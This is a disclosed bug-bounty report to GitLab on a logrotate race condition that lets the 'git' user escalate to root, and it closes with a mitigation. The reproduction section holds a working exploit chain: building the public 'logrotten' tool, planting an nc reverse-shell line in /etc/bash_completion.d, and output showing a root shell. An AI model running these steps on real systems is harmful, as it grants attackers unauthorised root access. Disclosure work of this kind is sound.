# Privilege escalation due to insecure use of logrotate

## Report Details
- **Report ID**: 578119
- **URL**: https://hackerone.com/reports/578119
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-05-12T18:55:01.844Z
- **Disclosed**: 2019-10-01T20:06:21.223Z

## Reporter
- **Username**: petee
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

Gitlab sets the ownership of the logdirectory to the system-user "git", which might let local users obtain root access because of unsafe interaction with logrotate.

### Steps to reproduce

Please note that the exploit is just a proof-of-concept. In order to win the race reliably the following requirements should met:

* filesystem on bare disk. don't use lvm2 or overlayfs
* don't use containers
* stop auditd
* stop tuned
* don't use selinux or apparmor


The following steps were tested with gitlab-ce and gitlab-ee on Debian Stretch(amd64):

1. ```apt-get install sudo git build-essential```
2. ```sudo -u git /bin/bash```
3. ```git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten```
4. ```cd /tmp/logrotten && gcc -o logrotten logrotten.c```
5. ```echo "hello gitlab" > /var/log/gitlab/gitlab-workhorse/something.log```
6. ```./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log```
7. ```echo "if [ \`id -u\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz```
8. ```nc -nvlp 3333```
9. A root-shell connects to port 3333 as soon as user root logins(for example via ssh)

### Impact

A privilege escalation from system-user git to system-user root is possible(local root exploit).

### Examples

The path of the logdirectory of gitlab can be manipulated by user git:
```
# logdir in gitlab-ee:
drwxr-xr-x 19 git root 4096 May 12 18:43 /var/log/gitlab/
```

Logfiles rotate once a day(or another frequency if configured) by logrotate as user root. Logrotates
configuration looks like following:
```
# logrotate-config of gitlab-ee:
/var/log/gitlab/gitlab-workhorse/*.log {
  hourly

  rotate 30
  compress
  copytruncate
  missingok
  postrotate

  endscript
}
```

Due to logrotate is prone to a race-condition it is possible for user "git" to replace the
directory /var/log/gitlab/gitlab-workhorse/ with a symbolik link to any
directory(for example /etc/bash_completion.d). Logrotate will place
files AS ROOT into /etc/bash_completition.d and set the owner of the file to "git".
An attacker could simply place a reverse-shell into this file. As soon as root logs in, a reverse
root-shell will be executed.

Details of the race-condition can be found at:

- [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
- [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)


### What is the current *bug* behavior?

Logrotate will write into any directory with root privileges and change the owner of the created file. This could lead to privilege escalation.

### What is the expected *correct* behavior?

Logrotate must not have permissions to write into any directory.

### Relevant logs and/or screenshots

#### Exploitation

Proof of concept:
```
git@Stretch64:~$ git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten
Cloning into '/tmp/logrotten'...
remote: Enumerating objects: 84, done.
remote: Counting objects: 100% (84/84), done.
remote: Compressing objects: 100% (58/58), done.
remote: Total 84 (delta 35), reused 64 (delta 24), pack-reused 0
Unpacking objects: 100% (84/84), done.
git@Stretch64:~$ cd /tmp/logrotten && gcc -o logrotten logrotten.c
git@Stretch64:/tmp/logrotten$ ./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
Waiting for rotating /var/log/gitlab/gitlab-workhorse/something.log...
Renamed /var/log/gitlab/gitlab-workhorse with /var/log/gitlab/gitlab-workhorse2 and created symlink to /etc/bash_completion.d
Done!
git@Stretch64:/tmp/logrotten$ ls -l /etc/bash_completion.d/
total 20
-rw-r--r-- 1 root root   439 Sep 28  2018 git-prompt
-rw-r--r-- 1 root root 11144 Oct 28  2018 grub
-rw-r--r-- 1 git  git     33 May 12 18:44 something.log.1.gz
git@Stretch64:/tmp/logrotten$ echo  "if [ \`id -u\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
git@Stretch64:/tmp/logrotten$ nc -nvlp 3333
listening on [any] 3333 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55526
id
uid=0(root) gid=0(root) groups=0(root)
ls -la
total 32
drwx------  4 root root 4096 May 12 18:47 .
drwxr-xr-x 22 root root 4096 Apr 25 18:31 ..
-rw-------  1 root root 1405 May 12 19:59 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 May 12 18:47 .config
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr 25 18:40 .ssh
-rw-------  1 root root 2194 May 12 17:29 .viminfo

```

Please note that for this example the exploit writes into /etc/bash_completion.d which requires that root logs in. It might be possible to exploit this bug without interaction of user root by writing into /etc/cron.d or anything similar.

### Output of checks

This bug was verified using the following installation methods:

- Omnibus gitlab-ee
- Omnibus gitlab-ce
- Manual installation using the instructions from https://docs.gitlab.com/ee/install/installation.html

#### Logrotate-configs and Logdir in gitlab-ee

/var/opt/gitlab/logrotate/logrotate.d:
```
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-pages/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-rails/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-shell//*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-workhorse/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/nginx/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/unicorn/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}

```

Permissions of the parent logdirectory:
```
drwxr-xr-x 19 git root 4096 May 12 19:58 /var/log/gitlab/
```

#### Logrotate-configs and Logdir in gitlab-ce

/var/opt/gitlab/logrotate/logrotate.d:
```
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-pages/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-rails/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-shell//*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-workhorse/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/nginx/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/unicorn/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
```

Permissions of the parent logdirectory:
```
drwxr-xr-x 19 git root 4096 May 10 23:39 /var/log/gitlab/
```

#### Logrotate-configs and Logdir in gitlab manually installed

The following configuration is taken from the installation-instructions that can be found at [https://docs.gitlab.com/ee/install/installation.html](https://docs.gitlab.com/ee/install/installation.html).

[/etc/logrotate.d/gitlab](https://docs.gitlab.com/ee/install/installation.html#set-up-logrotate):
```
/home/git/gitlab/log/*.log {
    daily
    missingok
    rotate 90
    compress
    notifempty
    copytruncate
}

/home/git/gitlab-shell/gitlab-shell.log {
    daily
    missingok
    rotate 90
    compress
    notifempty
    copytruncate
}
```

[Logdir is located in /home/git/gitlab and is configured with user "git"](https://docs.gitlab.com/ee/install/installation.html#clone-the-source):
```
sudo -u git -H git clone https://gitlab.com/gitlab-org/gitlab-ce.git -b X-Y-stable gitlab
```


#### Results of GitLab environment info

#### gitlab-ee

```
gitlab-rake gitlab:env:info

System information
System:         Debian 9.9
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.17.3
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.10.4-ee
Revision:       88a3c791734
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     9.6.11
URL:            https://gitlab.example.com
HTTP Clone URL: https://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        9.0.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```


#### gitlab-ce
```
System information
System:		Debian 9.8
Current User:	git
Using RVM:	no
Ruby Version:	2.5.3p105
Gem Version:	2.7.6
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.18.1
Sidekiq Version:5.2.5
Go Version:	unknown

GitLab information
Version:	11.10.4
Revision:	62c464651d2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	9.6.11
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	9.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

### Mitigation

Change the owner and group of /var/log/gitlab to root or use the "su"-directive in the logrotate configuration file.

## Impact

A privilege escalation from local system-user git to system-user root is possible(local root exploit).

## Attachments
No attachments
